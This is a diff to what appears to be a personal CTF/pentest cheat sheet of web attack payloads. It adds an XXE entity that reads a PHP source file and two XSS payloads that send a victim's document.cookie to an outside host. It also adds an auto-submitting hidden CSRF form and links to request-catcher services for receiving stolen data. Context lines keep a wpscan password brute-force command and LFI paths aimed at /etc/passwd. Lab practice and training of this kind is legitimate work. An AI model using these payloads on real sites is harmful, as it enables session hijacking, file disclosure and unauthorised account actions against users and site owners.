@@ -42,6 +42,13 @@ wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
   <quantity>&xxe;</quantity>
 </product>
 ```
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php">
+]>
+```
 #### php local file inclusion
 ```
 http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/../index
@@ -71,8 +78,19 @@ sqlmap -r req.txt-p  -D <database_name> --dump-all
 
 #### steal cookie
 ```
-webup
 <script>window.location='http://<ip>:port/?cookie=' + document.cookie</script>
+
+<script>document.write('<img src="https://site.com?cookie='+document.cookie+'"width=0 height=0 border=0 />');</script>
+```
+#### CSRF
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+    <form  id="csrf-form" target="csrf-frame" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="username" value="user" />
+      <input type="hidden" name="status" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
+<script>document.getElementById("csrf-form").submit()</script>
 ```
 #### lfi bypass
 ```
@@ -85,4 +103,6 @@ file/etc/%3F/../passwd?
 ```
 
 #### links
-- [ssrf](https://requestcatcher.com/)| [tools](https://webhook.site)
+- [xss](https://requestcatcher.com/)| [tools](https://webhook.site)| [request](https://fjksdfds.requestcatcher.com/)| [inspector](https://requestinspector.com/)
+- [steal admin cookie/sqli](./src/src_for_src/marketplace.md) (tryhackme:marketplace)
+- [ohmyweb](./src/src_for_src/omyweb.md)
